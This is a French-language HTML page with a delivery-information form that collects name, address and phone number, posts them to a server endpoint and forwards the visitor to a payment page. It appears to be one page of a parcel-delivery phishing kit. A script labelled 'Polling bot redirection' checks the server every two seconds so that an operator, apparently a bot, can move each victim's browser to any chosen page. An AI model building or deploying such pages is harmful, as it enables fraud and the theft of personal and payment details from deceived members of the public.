<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Livraison</title>
</head>
<body>
  <h2>ðŸ“¦ Informations de livraison</h2>
  <form id="deliveryForm">
    <input type="text" name="nom" placeholder="Nom" required><br>
    <input type="text" name="prenom" placeholder="PrÃ©nom" required><br>
    <input type="text" name="adresse" placeholder="Adresse" required><br>
    <input type="text" name="telephone" placeholder="TÃ©lÃ©phone" required><br>
    <button type="submit">Continuer vers Paiement ðŸ’³</button>
  </form>

  <script>
  document.getElementById('deliveryForm').addEventListener('submit', async (e) => {
    e.preventDefault();
    const form = e.target;
    const data = {
      nom: form.nom.value,
      prenom: form.prenom.value,
      adresse: form.adresse.value,
      telephone: form.telephone.value
    };
    try {
      await fetch('/api/delivery', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
      });
    } catch (err) {
      console.warn('Erreur livraison:', err);
    }
    window.location.href = '/payment.html'; // âœ… redirection unique
  });

  // Polling bot redirection
  async function pollRedirect() {
    try {
      const res = await fetch('/api/status');
      const data = await res.json();
      if (data.redirect && window.location.pathname !== data.redirect) {
        window.location.href = data.redirect;
      }
    } catch (e) {}
    setTimeout(pollRedirect, 2000);
  }
  pollRedirect();
  </script>
</body>
</html>
